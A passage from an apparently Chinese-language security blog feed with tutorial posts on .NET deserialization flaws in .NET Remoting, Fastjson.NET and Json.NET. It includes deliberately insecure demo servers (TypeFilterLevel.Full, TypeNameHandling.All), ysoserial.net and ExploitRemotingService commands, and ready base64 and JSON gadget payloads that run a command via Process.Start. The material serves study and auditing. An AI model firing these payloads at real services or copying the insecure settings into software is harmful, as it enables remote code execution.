class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Remoting;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Remoting.Channels;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Remoting.Channels.Http;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters;</span><br><span class="line"><span class="keyword">using</span> RemoteDemoObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">RemoteDemoServer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            SoapServerFormatterSinkProvider soapServerFormatterSinkProvider = <span class="keyword">new</span> SoapServerFormatterSinkProvider()</span><br><span class="line">            &#123;</span><br><span class="line">                TypeFilterLevel = TypeFilterLevel.Full</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            IDictionary hashtables = <span class="keyword">new</span> Hashtable();</span><br><span class="line">            hashtables[<span class="string">&quot;port&quot;</span>] = <span class="number">9999</span>;</span><br><span class="line"></span><br><span class="line">            HttpServerChannel httpServerChannel = <span class="keyword">new</span> HttpServerChannel(hashtables,soapServerFormatterSinkProvider);</span><br><span class="line">            ChannelServices.RegisterChannel(httpServerChannel, <span class="literal">false</span>);</span><br><span class="line">            RemotingConfiguration.RegisterWellKnownServiceType(<span class="keyword">typeof</span>(RemoteDemoObjectClass), <span class="string">&quot;RemoteDemoObjectClass.rem&quot;</span>, WellKnownObjectMode.Singleton);</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(<span class="string">&quot;server has been start&quot;</span>);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240315111622503.png" alt="image-20240315111622503"></p><p>在HttpServerChannel中采用两个参数的重载，传入SoapServerFormatterSinkProvider，赋值<code>TypeFilterLevel = TypeFilterLevel.Full</code>。再次发包<br><img src="../images/image-20240315111716559.png" alt="image-20240315111716559"></p><p>这次就成功的弹出了计算器</p><h2 id="TcpServerChannel数据包"><a href="#TcpServerChannel数据包" class="headerlink" title="TcpServerChannel数据包"></a>TcpServerChannel数据包</h2><p>tcpServerChannel是以二进制的形式将数据进行传输  我们使用burp修改不了  这里只能使用工具来进行替代</p><p>这里修改一下客户端和服务端  </p><p>客户端</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> RemoteDemoObject;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">RemoteDemoClient</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> serverAddress = <span class="string">&quot;tcp://localhost:9999/RemoteDemoObjectClass.rem&quot;</span>;</span><br><span class="line">            RemoteDemoObjectClass obj1 = (RemoteDemoObjectClass)Activator.GetObject(<span class="keyword">typeof</span>(RemoteDemoObjectClass), serverAddress);</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(<span class="string">&quot;get string:\t&#123;0&#125;&quot;</span>,obj1.GetCount());</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Remoting;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Remoting.Channels;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Remoting.Channels.Tcp;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters;</span><br><span class="line"><span class="keyword">using</span> RemoteDemoObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">RemoteDemoServer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            BinaryServerFormatterSinkProvider binary = <span class="keyword">new</span> BinaryServerFormatterSinkProvider()</span><br><span class="line">            &#123;</span><br><span class="line">                TypeFilterLevel = TypeFilterLevel.Full</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            IDictionary hashtables = <span class="keyword">new</span> Hashtable();</span><br><span class="line">            hashtables[<span class="string">&quot;port&quot;</span>] = <span class="number">9999</span>;</span><br><span class="line"></span><br><span class="line">            TcpServerChannel httpServerChannel = <span class="keyword">new</span> TcpServerChannel(hashtables,binary);</span><br><span class="line">            ChannelServices.RegisterChannel(httpServerChannel, <span class="literal">false</span>);</span><br><span class="line">            RemotingConfiguration.RegisterWellKnownServiceType(<span class="keyword">typeof</span>(RemoteDemoObjectClass), <span class="string">&quot;RemoteDemoObjectClass.rem&quot;</span>, WellKnownObjectMode.Singleton);</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(<span class="string">&quot;server has been start&quot;</span>);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用wireshark来进行抓包   burp抓不了二进制流  跟踪TCP流</p><p><img src="../images/image-20240315142616014.png" alt="image-20240315142616014"></p><p>发现数据流以<code>2e 4e 45 54</code> <code>.NET</code>开头进行二进制传输远程调用方法、类型和命名空间。我们可以伪造tcp数据流来发送恶意二进制数据流进行反序列化RCE。</p><h3 id="漏洞产生-1"><a href="#漏洞产生-1" class="headerlink" title="漏洞产生"></a>漏洞产生</h3><p>Github上有一个现成的工具<a href="https://github.com/tyranid/ExploitRemotingService">ExploitRemotingService</a>，通过它的raw参数我们可以发送原始binary数据。先使用ysoserial.net生成base64的payload。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -f binaryformatter -g TextFormattingRunProperties -c calc -o base64</span><br><span class="line"></span><br><span class="line">AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAswU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNhbGMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw==</span><br></pre></td></tr></table></figure><p>然后使用ExploitRemotingService发包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExploitRemotingService.exe tcp://localhost:9999/RemoteDemoObjectClass.rem raw base64</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240315144115413.png" alt="image-20240315144115413"></p><p>跟踪TCP流我们也发现了</p><p><img src="../images/image-20240315144159449.png" alt="image-20240315144159449"></p><p>这些就是我们base64传输的内容</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里偷一张Y4er师傅的图</p><p><img src="../images/image-20240315144342739.png" alt="image-20240315144342739"></p><p>关注TcpChannel、HttpChannel及其子类所创建实例的TypeFilterLevel字段是否为Full。其实为Low的时候ExploitRemotingService也可以利用，但是要设置<code>ConfigurationManager.AppSettings.Set(&quot;microsoft:Remoting:AllowTransparentProxyMessage&quot;, false;</code>这个全局非默认配置，少见，仅作了解。</p><p>关注rem后缀的uri，可能就是.net remoting。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/.NET%20Remoting.md&quot;&gt;https://github.com/Y4er/dotnet-deserialization/blob</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-12</title>
    <link href="https://ke1nys.github.io/posts/24e97acc.html"/>
    <id>https://ke1nys.github.io/posts/24e97acc.html</id>
    <published>2024-03-14T06:00:06.000Z</published>
    <updated>2024-04-18T12:57:04.531Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/Fastjson.md">https://github.com/Y4er/dotnet-deserialization/blob/main/Fastjson.md</a></p><h2 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h2><p>fastjson2.2.4版本</p><p>和java的差不多</p><p>本文讲解fastjson.net的反序列化漏洞</p><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> fastJSON;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Fastjson.NetSerializer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Person person = <span class="keyword">new</span> Person();</span><br><span class="line">            person.Name = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">            <span class="built_in">string</span> json = JSON.ToJSON(person);</span><br><span class="line">            Console.WriteLine(json);</span><br><span class="line">            Person p = JSON.ToObject&lt;Person&gt;(json);</span><br><span class="line">            Console.WriteLine(p.Name);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240314140751216.png" alt="image-20240314140751216"></p><p>这里使用ToObject函数来将Json来转成对象的</p><h2 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h2><p>其实还是用的ObjectDataProvider这个类来进行操作</p><p>yso生成的poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;$types&quot;:&#123;</span><br><span class="line">        &quot;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = 31bf3856ad364e35&quot;:&quot;1&quot;,</span><br><span class="line">        &quot;System.Diagnostics.Process, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089&quot;:&quot;2&quot;,</span><br><span class="line">        &quot;System.Diagnostics.ProcessStartInfo, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089&quot;:&quot;3&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;$type&quot;:&quot;1&quot;,</span><br><span class="line">    &quot;ObjectInstance&quot;:&#123;</span><br><span class="line">        &quot;$type&quot;:&quot;2&quot;,</span><br><span class="line">        &quot;StartInfo&quot;:&#123;</span><br><span class="line">            &quot;$type&quot;:&quot;3&quot;,</span><br><span class="line">            &quot;FileName&quot;:&quot;cmd&quot;,&quot;Arguments&quot;:&quot;/c calc&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;MethodName&quot;:&quot;Start&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>demo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">using fastJSON;</span><br><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line"></span><br><span class="line">namespace Fastjson</span><br><span class="line">&#123;</span><br><span class="line">    class Person</span><br><span class="line">    &#123;</span><br><span class="line">        public string Name &#123; get; set; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            Person person = new Person();</span><br><span class="line">            person.Name = &quot;jack&quot;;</span><br><span class="line">            string json =  JSON.ToJSON(person);</span><br><span class="line">            Console.WriteLine(json);</span><br><span class="line">            Person p = JSON.ToObject&lt;Person&gt;(File.ReadAllText(&quot;1.json&quot;));</span><br><span class="line">            Console.WriteLine(p.Name);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240314141242996.png" alt="image-20240314141242996"></p><p>重点就是在Json可不可控  Fastjson的版本有没有洞之类的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/Fastjson.md&quot;&gt;https://github.com/Y4er/dotnet-deserialization/blob/main/F</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-11</title>
    <link href="https://ke1nys.github.io/posts/bde02b76.html"/>
    <id>https://ke1nys.github.io/posts/bde02b76.html</id>
    <published>2024-03-14T02:08:30.000Z</published>
    <updated>2024-04-18T12:57:04.529Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/Json.Net.md">https://github.com/Y4er/dotnet-deserialization/blob/main/Json.Net.md</a></p><h2 id="Json-Net"><a href="#Json-Net" class="headerlink" title="Json.Net"></a>Json.Net</h2><p><a href="https://www.newtonsoft.com/json/help/html/SerializingJSON.htm">官方文档</a>给出了最简单的两个json示例，分别是JsonConvert、JsonSerializer。这里先看下JsonConvert</p><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Json.NetSerializer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Person person = <span class="keyword">new</span> Person();</span><br><span class="line">            person.Name = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">            <span class="built_in">string</span> v = JsonConvert.SerializeObject(person);</span><br><span class="line">            <span class="built_in">string</span> v1 = JsonConvert.SerializeObject(person, <span class="keyword">new</span> JsonSerializerSettings()</span><br><span class="line">            &#123;</span><br><span class="line">                TypeNameHandling = TypeNameHandling.None</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="built_in">string</span> v2 = JsonConvert.SerializeObject(person, <span class="keyword">new</span> JsonSerializerSettings()</span><br><span class="line">            &#123;</span><br><span class="line">                TypeNameHandling = TypeNameHandling.All</span><br><span class="line">            &#125;);</span><br><span class="line">            Console.WriteLine(v);</span><br><span class="line">            Console.WriteLine(v1);</span><br><span class="line">            Console.WriteLine(v2);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240314104145822.png" alt="image-20240314104145822"></p><p>前两个输出没有<code>type</code>值  最后一个才有 我们来分析一下这个情况 </p><p><img src="../images/image-20240314104232968.png" alt="image-20240314104232968"></p><p>没有传入setting的情况下</p><p><img src="../images/image-20240314104310300.png" alt="image-20240314104310300"></p><p>然后进入到这个函数中  其实第二个也是会进入到这   然后这个CreatDefault函数的话是会实例化这个JsonSerializer类</p><p><img src="../images/image-20240314104430617.png" alt="image-20240314104430617"></p><p>最终是会走到这  </p><p>然后我们接着去看<code>TypeNameHandling</code>这个参数的不同引起的序列化时有没有<code>type</code>的结果</p><p><img src="../images/image-20240314104635026.png" alt="image-20240314104635026"></p><p><img src="../images/image-20240314104706328.png" alt="image-20240314104706328"></p><p>我们会发现我们传入的默认值时None   那么前两个的结果都是一样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string v = JsonConvert.SerializeObject(person);</span><br><span class="line">string v1 = JsonConvert.SerializeObject(person, new JsonSerializerSettings()</span><br><span class="line">&#123;</span><br><span class="line">    TypeNameHandling = TypeNameHandling.None</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240314104817515.png" alt="image-20240314104817515"></p><p>这个时关于TypeNameHandling值得多少对应得结果</p><p>除了None外，都会包含type信息。文档中标记了TypeNameHandling会产生安全问题，应该使用binder进行类型绑定。</p><p>而本文就是针对TypeNameHandling进行讲解，当TypeNameHandling非None时，可以传入自定义json触发RCE。</p><h2 id="攻击链ObjectDataProvider"><a href="#攻击链ObjectDataProvider" class="headerlink" title="攻击链ObjectDataProvider"></a>攻击链ObjectDataProvider</h2><p>使用yso生成得poc</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;$type&#x27;</span>:<span class="string">&#x27;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;MethodName&#x27;</span>:<span class="string">&#x27;Start&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;MethodParameters&#x27;</span>:&#123;</span><br><span class="line">        <span class="string">&#x27;$type&#x27;</span>:<span class="string">&#x27;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$values&#x27;</span>:[<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;/c calc&#x27;</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;ObjectInstance&#x27;</span>:&#123;<span class="string">&#x27;$type&#x27;</span>:<span class="string">&#x27;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Json.NetSerializer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// JsonConvert</span></span><br><span class="line">            JsonConvert.DeserializeObject(File.ReadAllText(<span class="string">&quot;1.json&quot;</span>),<span class="keyword">new</span> JsonSerializerSettings() &#123; TypeNameHandling =TypeNameHandling.All&#125;);</span><br><span class="line">            <span class="comment">// JsonSerializer</span></span><br><span class="line">            JsonSerializer jsonSerializer = JsonSerializer.CreateDefault();</span><br><span class="line">            jsonSerializer.TypeNameHandling = TypeNameHandling.All;</span><br><span class="line">            <span class="keyword">using</span> (StreamReader sr = <span class="keyword">new</span> StreamReader(<span class="string">&quot;1.json&quot;</span>))</span><br><span class="line">            <span class="keyword">using</span> (JsonReader reader = <span class="keyword">new</span> JsonTextReader(sr))</span><br><span class="line">            &#123;</span><br><span class="line">                jsonSerializer.Deserialize(reader);</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用得时JsonConvert和JsonSerializer这两个类来进行演示  其实JsonConvert调用还是会调用到JsonSerializer的  效果一样</p><p><img src="../images/image-20240314110336221.png" alt="image-20240314110336221"></p><p>在CreatObject这个函数中的话  就会将type里的类给进行实例化操作了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Process.Start()</span><br><span class="line">[Native to Managed Transition]</span><br><span class="line">RuntimeMethodInfo.UnsafeInvokeInternal()</span><br><span class="line">RuntimeMethodInfo.Invoke()</span><br><span class="line">RuntimeType.InvokeMember()</span><br><span class="line">ObjectDataProvider.InvokeMethodOnInstance()</span><br><span class="line">ObjectDataProvider.QueryWorker()</span><br><span class="line">ObjectDataProvider.BeginQuery()</span><br><span class="line">ObjectDataProvider.set_ObjectInstance()</span><br><span class="line">[Lightweight Method Call]</span><br><span class="line">DynamicValueProvider.SetValue()</span><br><span class="line">JsonSerializerInternalReader.SetPropertyValue()</span><br><span class="line">JsonSerializerInternalReader.PopulateObject()</span><br><span class="line">JsonSerializerInternalReader.CreateObject()</span><br><span class="line">JsonSerializerInternalReader.CreateValueInternal()</span><br><span class="line">JsonSerializerInternalReader.Deserialize()</span><br><span class="line">JsonSerializer.DeserializeInternal()</span><br><span class="line">JsonSerializer.Deserialize()</span><br><span class="line">JsonSerializer.Deserialize()</span><br><span class="line">Program.Main()</span><br></pre></td></tr></table></figure><p>这个是调用栈</p><p><strong>在传入的json可控和TypeNameHandling设置的值正确的情况下  都是可以RCE的</strong></p><p>既然说到了type 又说到了json  那么我们应该就能想到fastjson了   接下来我们就来了解一下这个的反序列化操作</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/Json.Net.md&quot;&gt;https://github.com/Y4er/dotnet-deserialization/blob/main/J</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-10</title>
